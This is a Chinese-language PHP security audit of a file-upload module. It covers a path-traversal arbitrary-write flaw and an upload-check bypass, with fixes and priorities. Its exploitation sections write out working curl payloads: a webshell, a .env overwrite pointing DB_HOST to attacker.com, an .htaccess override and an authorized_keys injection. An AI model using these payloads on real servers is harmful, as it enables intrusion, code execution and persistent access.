# PHP 深度安全审计报告 — 文件上传模块

## 攻击面地图

| 入口 | 路由 | 鉴权 | 用户可控输入 | 对应 Sink |
|------|------|------|-------------|-----------|
| `uploadAvatar()` | `POST /upload/avatar` | 需登录 | `$_FILES['avatar']['type']`, `['name']`, `['tmp_name']` | `move_uploaded_file()` |
| `exportReport()` | `POST /upload/export` | 需登录 | `$_POST['filename']`, `$_POST['content']` | `file_put_contents()`, `mkdir()` |

---

## 漏洞 1：[高危] 路径穿越 + 任意文件写入 — `exportReport()` 的 `filename` 参数

### 传播链路

```
Source:  $_POST['filename']                                  ← UploadController.php:57 (路由: POST /upload/export)
  ↓ 直接赋值，默认 'report.csv' 但用户可覆盖
$filename = $_POST['filename'] ?? 'report.csv';              ← UploadController.php:57
  ↓
Source:  $_POST['content']                                   ← UploadController.php:58
  ↓ 直接赋值
$content = $_POST['content'] ?? '';                          ← UploadController.php:58
  ↓ 两个参数一同传入 FileService
$this->fileService->saveExport($filename, $content)           ← UploadController.php:61 (跨文件 → FileService.php)
  ↓ 方法签名接收
public function saveExport($filename, $content)               ← FileService.php:43
  ↓ 直接拼接 — 无 basename()、无 realpath()、无白名单
$targetPath = $this->exportDir . $filename;                   ← FileService.php:47
         = '/var/www/exports/' . $filename
  ↓ dirname() 提取目录部分
$dir = dirname($targetPath);                                 ← FileService.php:50
  ↓ 目录不存在则自动创建 (递归)
if (!is_dir($dir)) {
    mkdir($dir, 0755, true);                                 ← FileService.php:52  [辅助SINK: mkdir]
}
  ↓ 写入文件 — 路径和内容皆由用户控制
file_put_contents($targetPath, $content);                    ← FileService.php:56  [主SINK: file_put_contents]
```

### 过滤评估

| 节点 | 操作 | 有效性 |
|------|------|--------|
| UploadController.php:57 | `$_POST['filename'] ?? 'report.csv'` | ❌ 默认值仅当参数缺失时生效 |
| FileService.php:47 | `$this->exportDir . $filename` | ❌ 无 `basename()` 剥离路径 |
| FileService.php:47 | 路径拼接 | ❌ 无 `realpath()` 校验最终路径是否在允许目录内 |
| FileService.php:52 | `mkdir($dir, 0755, true)` | ❌ 递归创建目录，可被利用创建任意目录结构 |
| 整条链路 | 无任何过滤 | ❌ 文件名、内容、路径完全由用户控制 |

### 利用场景

```bash
# 场景 1：覆写 PHP 文件 — 写入 webshell
curl -X POST /upload/export \
  -d "filename=../../webroot/shell.php" \
  -d "content=<?php system(\$_GET['cmd']); ?>"

# $targetPath = /var/www/exports/../../webroot/shell.php
#              = /var/www/webroot/shell.php ← 写入 webshell
# 访问: http://target.com/shell.php?cmd=whoami

# 场景 2：覆写配置文件 — 泄露凭证
curl -X POST /upload/export \
  -d "filename=../../.env" \
  -d "content=DB_HOST=attacker.com"

# 场景 3：覆写 .htaccess — 启用 PHP 执行
curl -X POST /upload/export \
  -d "filename=../../../var/www/uploads/.htaccess" \
  -d "content=AddType application/x-httpd-php .jpg"

# 然后上传一个 .jpg 文件，服务器将其作为 PHP 执行

# 场景 4：SSH authorized_keys 写入
curl -X POST /upload/export \
  -d "filename=../../../root/.ssh/authorized_keys" \
  -d "content=ssh-rsa AAAAB3..."
```

### 修复建议

```php
public function saveExport($filename, $content)
{
    // 1. 剥离路径，只保留文件名
    $filename = basename($filename);

    // 2. 白名单扩展名
    $allowedExt = ['csv', 'xlsx', 'pdf', 'json'];
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    if (!in_array($ext, $allowedExt, true)) {
        return false;
    }

    // 3. 添加随机前缀防止文件名可预测
    $filename = bin2hex(random_bytes(16)) . '_' . $filename;
    $targetPath = $this->exportDir . $filename;

    // 4. 验证最终路径在允许目录内
    $realPath = realpath($this->exportDir);
    $realTarget = realpath(dirname($targetPath)) . '/' . $filename;
    if (strpos($realTarget, $realPath) !== 0) {
        return false;
    }

    // 5. 写入文件
    return file_put_contents($targetPath, $content) !== false;
}
```

---

## 漏洞 2：[中危] 文件上传绕过 — `uploadAvatar()` 多重校验缺陷

### 传播链路

```
Source:  $_FILES['avatar']                                  ← UploadController.php:33 (路由: POST /upload/avatar)
  ↓ 整体赋值
$file = $_FILES['avatar'];                                  ← UploadController.php:33
  ↓ 整体传入 FileService
$this->fileService->processAvatarUpload($file, $userId)      ← UploadController.php:37 (跨文件 → FileService.php)
  ↓ 方法签名接收 $file 数组
public function processAvatarUpload($file, $userId)           ← FileService.php:13

  【校验 1 — MIME 类型】:
  in_array($file['type'], $allowedImageTypes)               ← FileService.php:16
  $file['type'] 来自客户端 Content-Type 头 → 可伪造为 'image/png'

  【校验 2 — 扩展名】:
  $ext = pathinfo($file['name'], PATHINFO_EXTENSION)         ← FileService.php:21
  $file['name'] 来自客户端文件名 → 可伪造为 'shell.jpg'

  【文件名生成】:
  $newFilename = "avatar_{$userId}.{$ext}";                  ← FileService.php:28
  $targetPath = $this->uploadDir . $newFilename;              ← FileService.php:29
  ↓
move_uploaded_file($file['tmp_name'], $targetPath);          ← FileService.php:32  [SINK]
```

### 过滤评估 — 逐校验分析

#### 校验 1：MIME 类型（FileService.php:16）
| 方面 | 分析 |
|------|------|
| 检查值 | `$file['type']` = 客户端 `Content-Type` 头 |
| 可伪造 | ✅ 攻击者直接用 Burp 修改 Content-Type 为 `image/png` |
| 有效性 | ❌ **完全不依赖，可直接绕过** |

#### 校验 2：扩展名（FileService.php:21-25）
| 方面 | 分析 |
|------|------|
| 检查值 | `pathinfo($file['name'], PATHINFO_EXTENSION)` |
| 问题1 | 如果文件名是 `shell.jpg` → ext=`jpg` ✓ 通过，但文件内容可能是 PHP |
| 问题2 | 如果文件名是 `shell.php.jpg` → ext=`jpg` ✓ 通过，某些 Apache 配置会执行 `.php.jpg` |
| 问题3 | 文件名来自客户端 `$file['name']`，可随意修改 |
| 有效性 | ❌ **仅检查扩展名不检查内容，可绕过** |

#### 文件名生成（FileService.php:28）
| 方面 | 分析 |
|------|------|
| 格式 | `avatar_{userId}.{ext}` |
| 可预测 | ✅ 已知 userId 即可预测完整文件名 |
| 无随机 | ❌ **无随机化，可被枚举/覆盖** |

### 利用场景

```bash
# 上传 PHP webshell 伪装成 JPEG
curl -X POST /upload/avatar \
  -F "avatar=@shell.php;type=image/png;filename=avatar.jpg"

# $file['type'] = 'image/png' ← 通过 MIME 检查
# $file['name'] = 'avatar.jpg'← 通过扩展名检查
# 文件内容 = <?php system($_GET['cmd']); ?> ← 未被检查
# 保存为 /var/www/uploads/avatar_1.jpg

# 然后配合路径穿越漏洞写入 .htaccess:
# AddType application/x-httpd-php .jpg
# → 访问 /uploads/avatar_1.jpg?cmd=whoami → 代码执行！
```

### 修复建议

```php
public function processAvatarUpload($file, $userId)
{
    // 1. 使用 Fileinfo 检测真实 MIME（不可依赖客户端 Content-Type）
    $finfo = new \finfo(FILEINFO_MIME_TYPE);
    $realMime = $finfo->file($file['tmp_name']);
    $allowedMime = ['image/jpeg', 'image/png', 'image/gif'];
    if (!in_array($realMime, $allowedMime, true)) {
        return ['success' => false, 'error' => '不允许的文件类型'];
    }

    // 2. 检查真实图像尺寸（确认是有效图像文件）
    $imageInfo = getimagesize($file['tmp_name']);
    if ($imageInfo === false) {
        return ['success' => false, 'error' => '不是有效的图像文件'];
    }

    // 3. 重新生成安全的扩展名（基于真实 MIME）
    $extMap = ['image/jpeg' => 'jpg', 'image/png' => 'png', 'image/gif' => 'gif'];
    $ext = $extMap[$realMime];

    // 4. 随机化文件名
    $newFilename = bin2hex(random_bytes(16)) . '.' . $ext;
    $targetPath = $this->uploadDir . $newFilename;

    if (move_uploaded_file($file['tmp_name'], $targetPath)) {
        return ['success' => true, 'url' => "/uploads/{$newFilename}"];
    }

    return ['success' => false, 'error' => '文件保存失败'];
}
```

---

## 审计结论

### 已审计入口

| 入口 | 路由 | 漏洞 | 风险 |
|------|------|------|------|
| `exportReport()` | `POST /upload/export` | 路径穿越 + 任意文件写入 | **高** |
| `uploadAvatar()` | `POST /upload/avatar` | 文件上传校验绕过 (MIME + 扩展名) | **中** |
| `uploadAvatar()` | `POST /upload/avatar` | 文件名可预测 + 无随机化 | **低** |

### 风险汇总

| 等级 | 数量 | 详情 |
|------|------|------|
| 高 | 1 | 路径穿越 — `filename` 可覆写任意文件 |
| 中 | 1 | 文件上传绕过 — MIME/扩展名校验可伪造 |
| 低 | 1 | 文件名可预测 |
| **合计** | **3** | |

### 修复优先级

1. **P0（立即修复）：** `saveExport()` 的路径穿越 — 添加 `basename()` + 白名单 + `realpath()` 校验
2. **P1（24小时内）：** `uploadAvatar()` 的文件上传校验 — 用 `finfo` 检测真实 MIME + `getimagesize()` 验证
3. **P2（本周内）：** 上传文件名随机化

### 安全加固建议

- 所有文件路径操作统一使用 `basename()` 剥离目录穿越字符
- 上传文件内容必须用 `finfo` 或 `getimagesize()` 验证真实类型，不信任客户端提供的任何元数据
- 上传目录配置 `.htaccess` 禁止脚本执行：`php_flag engine off`
- 文件名使用随机字符串（`bin2hex(random_bytes(16))`），避免可预测性
- 导出功能的路径使用 `realpath()` 校验最终路径在允许目录内
